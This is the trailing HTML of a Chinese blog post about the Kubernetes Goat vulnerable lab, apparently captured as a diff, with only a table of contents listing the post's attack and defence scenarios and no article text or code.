+    <a href="https://www.giantbranch.cn/2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/" title="Kubernetes Goat：Kubernetes 漏洞靶场">https://www.giantbranch.cn/2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Kubernetes/" rel="tag"># Kubernetes</a>
+          
+            <a href="/tags/security/" rel="tag"># security</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/04/26/AFL fuzz性能提升tips/" rel="next" title="AFL fuzz性能提升tips">
+                <i class="fa fa-chevron-left"></i> AFL fuzz性能提升tips
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/06/20/试用clusterfuzzlite/" rel="prev" title="试用clusterfuzzlite">
+                试用clusterfuzzlite <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#代码中的敏感keys-Sensitive-keys-in-codebases"><span class="nav-number">1.</span> <span class="nav-text">代码中的敏感keys(Sensitive keys in codebases)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DIND-docker-in-docker-exploitation"><span class="nav-number">2.</span> <span class="nav-text">DIND (docker-in-docker) exploitation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kubernetes-K8S-中的-SSRF"><span class="nav-number">3.</span> <span class="nav-text">Kubernetes (K8S) 中的 SSRF</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#容器逃逸-Container-escape-to-the-host-system"><span class="nav-number">4.</span> <span class="nav-text">容器逃逸(Container escape to the host system)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Docker-CIS-基准分析"><span class="nav-number">5.</span> <span class="nav-text">Docker CIS 基准分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kubernetes-CIS-基准分析"><span class="nav-number">6.</span> <span class="nav-text">Kubernetes CIS 基准分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#攻击私有仓库-Attacking-private-registry"><span class="nav-number">7.</span> <span class="nav-text">攻击私有仓库(Attacking private registry)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NodePort暴露服务"><span class="nav-number">8.</span> <span class="nav-text">NodePort暴露服务</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Helm-v2-tiller-to-PwN-the-cluster-已弃用"><span class="nav-number">9.</span> <span class="nav-text">Helm v2 tiller to PwN the cluster[已弃用]</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析挖矿容器-Analysing-crypto-miner-container"><span class="nav-number">10.</span> <span class="nav-text">分析挖矿容器(Analysing crypto miner container)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kubernetes-命名空间绕过-Kubernetes-namespaces-bypass"><span class="nav-number">11.</span> <span class="nav-text">Kubernetes 命名空间绕过(Kubernetes namespaces bypass)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#获取环境信息"><span class="nav-number">12.</span> <span class="nav-text">获取环境信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DOS内存或CPU等资源"><span class="nav-number">13.</span> <span class="nav-text">DOS内存或CPU等资源</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hacker-container"><span class="nav-number">14.</span> <span class="nav-text">Hacker container</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#隐藏在镜像层中的信息"><span class="nav-number">15.</span> <span class="nav-text">隐藏在镜像层中的信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RBAC-最低权限配置错误"><span class="nav-number">16.</span> <span class="nav-text">RBAC 最低权限配置错误</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#KubeAudit-审计-Kubernetes-集群"><span class="nav-number">17.</span> <span class="nav-text">KubeAudit - 审计 Kubernetes 集群</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Falco-运行时安全监控和检测"><span class="nav-number">18.</span> <span class="nav-text">Falco - 运行时安全监控和检测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Popeye-Kubernetes-集群sanitizer"><span class="nav-number">19.</span> <span class="nav-text">Popeye - Kubernetes 集群sanitizer</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#使用-NSP-保护网络边界"><span class="nav-number">20.</span> <span class="nav-text">使用 NSP 保护网络边界</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/';
+          this.page.identifier = '2022/06/13/Kubernetes Goat：Kubernetes 漏洞靶场/';
+          this.page.title = 'Kubernetes Goat：Kubernetes 漏洞靶场';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
